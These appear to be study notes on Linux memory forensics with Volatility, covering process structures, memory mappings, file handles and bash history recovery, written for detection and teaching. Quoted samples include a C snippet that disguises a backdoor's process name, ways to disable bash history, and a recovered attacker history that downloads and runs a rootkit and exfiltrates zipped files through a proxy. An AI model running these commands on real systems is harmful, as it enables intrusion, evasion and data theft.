## 1. `task_struct`
- structure that represents processes in Linux kernel memory
- contains all information necessary to link process with:
	- opened file descriptors
	- memory maps
	- authentication credentials
- instances are allocated from kernel memory cache(`kmem_cache`) and stored within a cache named `task_struct_cachep`

## 2. process analysis objectives
- identify processes and children
- distinguish processes from kernel threads: malware may disguise as kernel threads, which use the same DS.
- associate processes to users and groups

## 3. process DS
- `task_stuct`:
	``` python
	>>> dt("task_struct")
	'task_struct' (1776 bytes)
	0x0 : state ['long']
	0x8 : stack ['pointer', ['void']]
	0x10 : usage ['__unnamed_0x38e']
	0x14 : flags ['unsigned int']
	0x18 : ptrace ['unsigned int']
	0x20 : wake_entry ['llist_node']
	[snip]
	0x170 : tasks ['list_head']
	0x180 : pushable_tasks ['plist_node']
	0x1a8 : mm ['pointer', ['mm_struct']]
	0x1b0 : active_mm ['pointer', ['mm_struct']]
	[snip]
	0x1e4 : pid ['int']
	0x1e8 : tgid ['int']
	0x1f0 : stack_canary ['unsigned long']
	0x1f8 : real_parent ['pointer', ['task_struct']]
	0x200 : parent ['pointer', ['task_struct']]
	0x208 : children ['list_head']
	0x218 : sibling ['list_head']
	0x228 : group_leader ['pointer', ['task_struct']]
	[snip]
	0x350 : cpu_timers ['array', 3, ['list_head']]
	0x380 : real_cred ['pointer', ['cred']]
	0x388 : cred ['pointer', ['cred']]
	0x390 : replacement_session_keyring ['pointer', ['cred']]
	0x398 : comm ['String', {'length': 16}]
	[snip]
	```
	- `tasks`: reference to linked list of active processes
	- `mm`: 
		- stores memory management data
		- physical offset of DTB can be found at `mm->pgd`
	- `pid`
	- `parent`
	- `children`: list of children
	- `cred`:
		- credential information for process
		- may include UID and GID depending on kernel version
	- `comm`: 
		- name of process in 16-byte character array
		- ends with forward slash followed by a number for kernel threads; number indicates the CPU where it is executed
	- `start_time`

## 4. SLAB and SLUB
- `task_struct` may use different back-end allocators depending on `CONFIG_SLAB` and `CONFIG_SLUB` kernel config options
- memory managers serving same purpose as pool allocations on Windows; allocating and deallocating structures of same size in an efficient manner from a large preallocated block of kernel memory
- allocator impoacts how to find process structures in memory
- SLAB(older) tracks allocations of all objects of a particular type
- SLUB does not track allocations; unreliable for enumerating objects

## 5. process enumeration - active process list
- used by kernel to maintain set of active processes
- not exported to userland
- *linux_pslist* plugin enumerates processes by walking list pointed to by global `init_task` variable
- *init_task*:
	- statically allocated within kernel
	- initialized at boot
	- has PID 0
	- has name swapper
	- does not appear in process lists generated through *ps* or `/proc`

## 6. *linux_pslist* plugin
- example output:
	``` data
	$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_pslist
	Volatility Foundation Volatility Framework 2.4
	Offset Name Pid Uid Gid DTB Start Time
	------------------ ------------ --- --- --- ---- ----------
	0xffff88003e253510 init 1 0 0 0x37088000 2013-10-31 07:08:24
	0xffff88003e252e20 kthreadd 2 0 0 ---------- 2013-10-31 07:08:24
	0xffff88003e252730 ksoftirqd/0 3 0 0 ---------- 2013-10-31 07:08:24
	0xffff88003e283550 kworker/u:0 5 0 0 ---------- 2013-10-31 07:08:24
	[snip]
	```
	- kernel threads do not have a DTB because they use the kernel's address space
- cross-reference UIDs and GIDs with contents from `/etc/passwd` and /etc/group`:
	``` sh
	$ grep 33 /etc/{passwd,group}
	/etc/passwd:www-data:x:33:33:www-data:/var/www:/bin/sh
	/etc/group:www-data:x:33:
	```
- *linux_pstree* plugin can visualize parent/child relationships:
	``` data
	$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_pstree
	Volatility Foundation Volatility Framework 2.4
	Name Pid Uid
	init 1 0
	.udevd 348 0
	..udevd 466 0
	..udevd 467 0
	<snip>
	.sshd 2358 0
	..sshd 2745 0
	...bash 2747 0
	....insmod 8643 0
	.postgres 2381 104
	..postgres 2384 104
	..postgres 2385 104
	..postgres 2386 104
	..postgres 2387 104
	[kthreadd] 2 0
	.[ksoftirqd/0] 3 0
	.[kworker/u:0] 5 0
	.[migration/0] 6 0
	.[watchdog/0] 7 0
	.[migration/1] 8 0
	.[ksoftirqd/1] 10 0
	.[watchdog/1] 12 0
	```
	- `init`, PID 1, is always root of process tree except for kernel threads
	- only children of `kthreadd`, kernel thread daemon, are kernel threads; can filter malware attempts to disguise themselves by using brackets

## 7. process enumeration - PID hash table
- per-process directories under `/proc` are populated from global PID hash table
- rootkits that want to hide processes must tamper with this DS or perform control flow redirection within `/proc` FS or supporting system calls
- parsing PID hash table varies greatly between kernel versions

## 8. process address space
- as runtime loader maps executable, shared libraries, stack, heap, and other regions into the process address space, it creates DS within kernel to track them
- for each mapping kernel must track:
	- start/end address
	- permissions
	- backing file information
	- metadata used for caching and searching

## 9. process address space analysis objectives
- process memory classification
- command line argument to process
- environment variables
- detect code injection

## 10. process address space DS
- `mm` member of `task_struct` is of type `mm_struct`:
	``` python
	>>> dt("mm_struct")
	'mm_struct' (920 bytes)
	0x0 : mmap ['pointer', ['vm_area_struct']]
	0x8 : mm_rb ['rb_root']
	0x10 : mmap_cache ['pointer', ['vm_area_struct']]
	[snip]
	0x48 : pgd ['pointer', ['__unnamed_0x906']]
	0x50 : mm_users ['__unnamed_0x38e']
	0x54 : mm_count ['__unnamed_0x38e']
	0x58 : map_count ['int']
	[snip]
	0xe8 : start_code ['unsigned long']
	0xf0 : end_code ['unsigned long']
	0xf8 : start_data ['unsigned long']
	0x100 : end_data ['unsigned long']
	0x108 : start_brk ['unsigned long']
	0x110 : brk ['unsigned long']
	0x118 : start_stack ['unsigned long']
	0x120 : arg_start ['unsigned long']
	0x128 : arg_end ['unsigned long']
	0x130 : env_start ['unsigned long']
	0x138 : env_end ['unsigned long']
	[snip]
	0x358 : ioctx_lock ['spinlock']
	0x360 : ioctx_list ['hlist_head']
	0x368 : owner ['pointer', ['task_struct']]
	0x370 : exe_file ['pointer', ['file']]
	0x378 : num_exe_file_vmas ['unsigned long']
	[snip]
	```
	- `mmap`: stores individual process memory mappings as linked list
	- `mm_rb`: stores individual process memory mappings as red-black tree
	- `pgd`: 
		- address of process DTB
		- used to read from address space of process
		- holds references to important portions of process address space
		- NULL for kernel threads
	- `owner`: 
		- back pointer to `task_struct`
		- on kernels with this enabled and SLAB allocators in use, can serve as alternative source of process listings because `mm_struct` are tracked by the cache
	- `start_code` and `end_code`
	- `start_data` and `end_data`
	- `start_brk`: pointer to start of heap
	- `brk`: pointer to end of heap
	- `start_stack`: pointer to start of stack
	- `arg_start`: pointer to start of command line arguments
	- `arg_end`: pointer to end of command line arguments
	- `env_start` and `env_end`
- `mmap` and `mm_rb` contain `vm_area_struct` elements:
	``` python
	>>> dt("vm_area_struct")
	'vm_area_struct' (176 bytes)
	0x0 : vm_mm ['pointer', ['mm_struct']]
	0x8 : vm_start ['unsigned long']
	0x10 : vm_end ['unsigned long']
	0x18 : vm_next ['pointer', ['vm_area_struct']]
	0x20 : vm_prev ['pointer', ['vm_area_struct']]
	0x28 : vm_page_prot ['pgprot']
	0x30 : vm_flags ['LinuxPermissionFlags',
	{'bitmap': {'x': 2, 'r': 0, 'w': 1}}]
	0x38 : vm_rb ['rb_node']
	0x50 : shared ['__unnamed_0xa071']
	0x70 : anon_vma_chain ['list_head']
	0x80 : anon_vma ['pointer', ['anon_vma']]
	0x88 : vm_ops ['pointer', ['vm_operations_struct']]
	0x90 : vm_pgoff ['unsigned long']
	0x98 : vm_file ['pointer', ['file']]
	0xa0 : vm_private_data ['pointer', ['void']]
	0xa8 : vm_policy ['pointer', ['mempolicy']]
	```
	- `vm_start`: start of VA within process address space
	- `vm_end`: end of VA
	- `vm_next` and `vm_prev`
	- `vm_flags`: indicates whether region was map permissions
	- `vm_pgoff`: offset into file that region maps
	- `vm_file`: 
		- pointer to `file` structure of the file region maps
		- NULL if memory-backed region

## 11. enumerating process mappings
- `mmap` is used to populate `/proc/<pid>/maps` files:
	``` data
	$ cat /proc/1/maps
	00400000-00409000 r-xp 00000000 08:01 1044487
		/sbin/init
	00608000-00609000 rw-p 00008000 08:01 1044487
		/sbin/init
	01dc1000-01de2000 rw-p 00000000 00:00 0
		[heap]
	[snip]
	7f9880b18000-7f9880b1a000 r-xp 00000000 08:01 130572
		/lib/x86_64-linux-gnu/libdl-2.13.so
	[snip]
	```
- mappings can reveal signs of code injection:
	- shared library loaded from `/tmp`
	- shared library with suspicious name
- create whitelist of shared libraries on clean Linux installation to compare for discrepencies
- process mappings can be valuable for validating where a process is executing from

## 12. *linux_proc_maps* plugin
- walks `task_struct->mm->mmap` of each process:
	``` data
	$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_proc_maps -p 1
	Volatility Foundation Volatility Framework 2.4
	Pid Start End Flags Pgoff Major Minor Inode Path
	-- ------------------ ------------------ ------ ----- ----- ------ ----- ----
	1 0x0000000000400000 0x0000000000409000 r-x 0x0 8 1 1044487
	/sbin/init
	1 0x0000000000608000 0x0000000000609000 rw- 0x8000 8 1 1044487
	/sbin/init
	1 0x0000000001dc1000 0x0000000001de2000 rw- 0x0 0 0 0
	[heap]
	1 0x00007f9880b18000 0x00007f9880b1a000 r-x 0x0 8 1 130572
	/lib/x86_64-linux-gnu/libdl-2.13.so
	```

## 13. *linux_dump_maps* plugin
- extracts memory mappings of process
- example usage:
	``` data
	$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_dump_map -p 1 -s 0x400000 -D dump
	Volatility Foundation Volatility Framework 2.4
	Task VM Start VM End Length Path
	-------- ------------------ ------------------ ------- ----
	1 0x0000000000400000 0x0000000000409000 0x9000 dump/task.1.0x400000.vma
	$ file dump/task.1.0x400000.vma
	dump/task.1.0x400000.vma: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), stripped
	```

## 14. *linux_psaux* plugin
- recovers additional information such as running directory and options passed
- gathers arguments by switching to process address space through `task_struct.get_process_address_space()` and reading address pointed to by `mm_struct->arg_start`
- example usage:
	``` data
	$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_psaux
	Volatility Foundation Volatility Framework 2.4
	Pid Uid Gid Arguments
	1 0 0 init [2]
	2 0 0 [kthreadd]
	3 0 0 [ksoftirqd/0]
	5 0 0 [kworker/u:0]
	6 0 0 [migration/0]
	7 0 0 [watchdog/0]
	[snip]
	```

## 15. manipulating command line arguments
- code responsible for reading arguments:
	``` C
	// in fs/proc/base.c file
	static const struct pid_entry tgid_base_stuff[] = {
		<snip>
		INF("cmdline", S_IRUGO, proc_pid_cmdline), <snip>
	}
	```
	- use `INF` macro to create `cmdline` file and set it readable by all files
	- registers `proc_pid_cmdline` function as callback when file is read
- `proc_pid_cmdline`:
	``` C
	static int proc_pid_cmdline(struct task_struct *task, char * buffer) {
		<snip>
		len = mm->arg_end - mm->arg_start;
		<snip>
		res = access_process_vm(task, mm->arg_start, buffer, len, 0);
	}
	```
	- reads `mm->arg_start` 
- code that overwrites program name and arguments:
	``` C
	#include <stdio.h>
	int main(int argc, char *argv[])
	{
		char *my_args = "apache2\x00-k\x00start\x00";
		memcpy(argv[0], my_args, 17);
		while(1)
			sleep(1000);
	}
	```
	- string overwrites arguments
	``` sh
	$ /tmp/backdoor arg1 &
	[1] 24896
	$ cat /proc/24896/cmdline | xxd
	0000000: 6170 6163 6865 3200 2d6b 0073 7461 7274 apache2.-k.start
	0000010: 00 .
	$ ps aux | grep 24896
	vol 24896 0.0 0.0 3932 316 pts/2 S 10:00 0:00 apache2 -k start
	$ python vol.py --profile=LinuxDebian-3_2x64 -f hiddenargs.lime linux_psaux -p 24896
	Volatility Foundation Volatility Framework 2.4
	Pid Uid Gid Arguments
	24896 1005 1005 apache2 -k start
	```
	- path and arguments overwritten
	```sh
	$ python vol.py --profile=LinuxDebian-3_2x64 -f hiddenargs.lime linux_pslist -p 24896
	Volatility Foundation Volatility Framework 2.4
	Offset Name Pid Uid Gid DTB Start Time
	------------------ --------- ----- ---- --- ---------- -------------------
	0xffff880036e3d550 backdoor 24896 1005 1005 0x3d50e000 2013-11-20 16:00:40
	$ python vol.py --profile=LinuxDebian-3_2x64 -f hiddenargs.lime linux_proc_maps -p 24896
	Volatility Foundation Volatility Framework 2.4
	Pid Start End Flags Pgoff Major Minor Inode File Path
	-------- ------- -------- ----- ----- ----- ----- ------ ----------------
	24896 0x400000 0x401000 r-x 0x0 8 1 1059161 /tmp/backdoor
	24896 0x600000 0x601000 rw- 0x0 8 1 1059161 /tmp/backdoor
	<snip>
	```
	- *linux_pslist* and *linux_proc_maps* reveals true name and path

## 16. *linux_psenv* plugin
- initial set of *Environment Variables(EV)* is passed as third parameter to `main`
- EVs are stored in statically allocated buffer of null-terminated strings; can't be modified at runtime
- EVs set by calling *setenv* are stored in an alternate location
- operates same way as *linux_psaux*, except it leverages `mm_struct->env_start` and `mm_struct->env_end` members
- example output:
	``` data
	$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_psenv
	Volatility Foundation Volatility Framework 2.4
	Name Pid Environment
	init 1 HOME=/ init=/sbin/init TERM=linux
		BOOT_IMAGE=/boot/vmlinuz-3.2.0-4-amd64
		PATH=/sbin:/usr/sbin:/bin:/usr/bin PWD=/ rootmnt=/root
	kthreadd 2
	[snip]
	watchdog/0 7
	migration/1 8
	ksoftirqd/1 10
	[snip]
	sshd 2358 CONSOLE=/dev/console HOME=/
		init=/sbin/init runlevel=2 INIT_VERSION=sysvinit-2.88
		TERM=linux COLUMNS=80 BOOT_IMAGE=/boot/vmlinuz-3.2.0-4-amd64
		PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/sbin:/sbin
		RUNLEVEL=2 PREVLEVEL=N SHELL=/bin/sh PWD=/
		previous=N LINES=25 rootmnt=/root
	bash 2747 USER=root LOGNAME=root HOME=/root
		PATH=/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11
		MAIL=/var/mail/root SHELL=/bin/bash SSH_CLIENT=192.168.174.1 54944 22
		SSH_CONNECTION=192.168.174.1 54944 192.168.174.169 22
		SSH_TTY=/dev/pts/0 TERM=xterm LANG=en_US.UTF-8
	[snip]
	insmod 8643 TERM=xterm SHELL=/bin/bash
		SSH_CLIENT=192.168.174.1 54944 22
		SSH_TTY=/dev/pts/0 USER=root MAIL=/var/mail/root
		PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
		PWD=/root/lime LANG=en_US.UTF-8 SHLVL=1 HOME=/root LOGNAME=root
		SSH_CONNECTION=192.168.174.1 54944 192.168.174.169 22
		_=/sbin/insmod OLDPWD=/root
	```
	- there are several variables pointing to the working directory of daemons inside *sshd* and *postgres* processes
	- *bash* spawned over SSH because `SSH_CONNECTION` EV is set with IP and port of connecting user
	- EV `USER` shows user `root` logged in over SSH
	- EV ``_`` shows full path of executed command
- kernel threads don't have EVs

## 17. file handles
- files, pipes, sockets, IPC records, etc are treated as files and references by a *File Descriptor(FD)* within processes
- stored within kernel memory
- each process has a table with an array with FD number as the index and value set to point to `file` instance
- process FD table is in `files` member of `task_struct`

## 18. file handle analysis objectives
- determine opened file handles
- understand common FDs
- detect keyloggers

## 19. file handle DS
- `file`:
	``` python
	>>> dt("file")
	'file' (208 bytes)
	0x0 : f_u ['__unnamed_0x8bc2']
	0x10 : f_path ['path']
	0x20 : f_op ['pointer', ['file_operations']]
	0x28 : f_lock ['spinlock']
	0x2c : f_sb_list_cpu ['int']
	0x30 : f_count ['__unnamed_0x3b0']
	0x38 : f_flags ['unsigned int']
	0x3c : f_mode ['unsigned int']
	0x40 : f_pos ['long long']
	0x48 : f_owner ['fown_struct']
	0x68 : f_cred ['pointer', ['cred']]
	0x70 : f_ra ['file_ra_state']
	0x90 : f_version ['unsigned long long']
	0x98 : f_security ['pointer', ['void']]
	0xa0 : private_data ['pointer', ['void']]
	0xa8 : f_ep_links ['list_head']
	0xb8 : f_tfile_llink ['list_head']
	0xc8 : f_mapping ['pointer', ['address_space']]
	```
	- `f_path`: holds reference to information needed to reconstruct name and path of file
	- `f_mode`: file access mode
	- `f_pos`: next read/write position
	- `f_mapping`: reference to `address_space` structure of file that stores pointers into page cache
	- `f_op`: 
		- identifies set of file operation pointers for the FD
		- operations(functions) are called when a process reads, writes, seeks, etc
	
## 20. *linux_lsof* plugin
- walks process FD table and prints FD number and path
- example output:
	``` data
	$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_lsof -p 8643
	Volatility Foundation Volatility Framework 2.4
	Pid FD Path
	-------- -------- ----
	8643 0 /dev/pts/0
	8643 1 /dev/pts/0
	8643 2 /dev/pts/0
	8643 3 /root/lime/lime-3.2.0-4-amd64.ko
	```
- keylogger output:
	``` data
	$ python vol.py --profile=LinuxDebian-3_2x64 -f keylog.lime linux_lsof -p 8625
	Volatility Foundation Volatility Framework 2.4
	Pid FD Path
	-------- -------- ----
	8625 0 /dev/input/event0
	8625 1 /usr/share/logfile.txt
	8625 2 /dev/pts/1
	8625 3 /usr/share/bash-completion/completions
	```
	- `/dev/input/event0` file is a handle to the keyboard

## 21. bash memory DS
- ``_hist_entry``:
	``` python
	>>> dt("_hist_entry")
	'_hist_entry' (24 bytes)
	0x0 : line ['pointer', ['String', {'length': 1024}]]
	0x8 : timestamp ['pointer', ['String', {'length': 1024}]]
	0x10 : data ['pointer', ['void']
	```
	- `line`: command entered by user

## 22. bash history
- bash commands are logged into user's history file at `~/.bash_history`
- can be disabled by:
	- unsetting `HISTFILE` EV or pointing it to `/dev/null`
	- setting `HISTSIZE` EV to 0
	- logging in using SSH client with `-T` set to prevent pseudoterminal allocation
- disabling does not affect memory forensics; commands with their time remain in memory
- history file is loaded into memory when bash shell opens
- history file without timestamps will be assigned a default timestamp of when bash process started

## 23. *linux_bash* plugin
- recovers ``_hist_entry`` structures from memory
- works by scanning heap for `#` characters that prefix each timestamp and rescanning for pointers to them
- example output:
	``` data
	$ python vol.py --profile=Linuxdfrws-profilex86 -f challenge.mem
	linux_bash -p 2585
	Pid Name Command Time Command
	-------- ----- ------------------------------ -------
	2585 bash 2007-12-17 03:24:21 UTC+0000 unset HISTORY
	2585 bash 2007-12-17 03:24:21 UTC+0000 cd xmodulepath
	2585 bash 2007-12-17 03:24:21 UTC+0000 wget http://metasploit.com/users/hdm/tools/xmodulepath.tgz
	2585 bash 2007-12-17 03:24:21 UTC+0000 tar -zpxvf xmodulepath.tgz
	2585 bash 2007-12-17 03:24:21 UTC+0000 ./root.sh
	2585 bash 2007-12-17 03:24:21 UTC+0000 id
	2585 bash 2007-12-17 03:24:21 UTC+0000 mkdir temp
	2585 bash 2007-12-17 03:24:21 UTC+0000 cd temp
	2585 bash 2007-12-17 03:24:21 UTC+0000 cp /mnt/hgfs/Admin_share/*.pcap .
	2585 bash 2007-12-17 03:24:21 UTC+0000 cp /mnt/hgfs/Admin_share/*.xls .
	2585 bash 2007-12-17 03:24:21 UTC+0000 cp /mnt/hgfs/Admin_share/intranet.vsd .
	2585 bash 2007-12-17 03:24:40 UTC+0000 ls /mnt/hgfs/Admin_share/
	2585 bash 2007-12-17 03:26:20 UTC+0000 zip archive.zip /mnt/hgfs/Admin_share/acct_prem.xls /mnt/hgfs/Admin_share/domain.xls /mnt/hgfs/Admin_share/ftp.pcap
	2585 bash 2007-12-17 03:26:55 UTC+0000 unset HISTFILE
	2585 bash 2007-12-17 03:26:59 UTC+0000 unset HISTSIZE
	2585 bash 2007-12-17 03:27:46 UTC+0000 zipcloak archive.zip
	2585 bash 2007-12-17 03:28:25 UTC+0000 ll -h
	2585 bash 2007-12-17 03:28:54 UTC+0000 cp /mnt/hgfs/software/xfer.pl .
	2585 bash 2007-12-17 03:28:57 UTC+0000 ll -h
	2585 bash 2007-12-17 03:29:56 UTC+0000 export http_proxy="http://219.93.175.67:80"
	2585 bash 2007-12-17 03:30:00 UTC+0000 env | less
	2585 bash 2007-12-17 03:31:56 UTC+0000 ./xfer.pl archive.zip
	2585 bash 2007-12-17 04:32:50 UTC+0000 unset http_proxy
	2585 bash 2007-12-17 04:32:53 UTC+0000 rm xfer.pl
	2585 bash 2007-12-17 04:33:26 UTC+0000 dir
	2585 bash 2007-12-17 04:33:29 UTC+0000 rm archive.zip
	```
	- first commands have same timestamp; commands from history file showing when bash process started

## 24. bash command hash table
- contains full path to commands and number of times they executed
- can be viewed with the *hash* command inside a bash shell
- useful for finding fake binaries inside different paths:
	``` data
	$ python vol.py --profile=LinuxDebian-3_2x64 -f backdooredrm.lime linux_bash_hash -p 23971
	Volatility Foundation Volatility Framework 2.4
	Pid Name Hits Command Full Path
	-------- -------------------- ------ ------------------------- ---------
	23971 bash 1 df /bin/df
	23971 bash 1 rmmod /sbin/rmmod
	23971 bash 1 rm /tmp/rm
	23971 bash 1 vim /usr/bin/vim
	23971 bash 1 cat /bin/cat
	23971 bash 1 insmod /sbin/insmod
	23971 bash 2 ls /bin/ls
	23971 bash 3 clear /usr/bin/clear
	$ python vol.py --profile=LinuxDebian-3_2x64 -f backdooredrm.lime linux_bash_env -p 23971
	Volatility Foundation Volatility Framework 2.4
	Pid Name Vars
	-------- -------- ----
	23971 bash TERM=xterm SHELL=/bin/bash SSH_CLIENT=192.168.174.1 54634 22
		OLDPWD=/root SSH_TTY=/dev/pts/2 USER=root MAIL=/var/mail/root
		PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
	```
	- *linux_bash_hash* and *linux_bash_env* plugins used to find fake *rm* at `/tmp/rm`
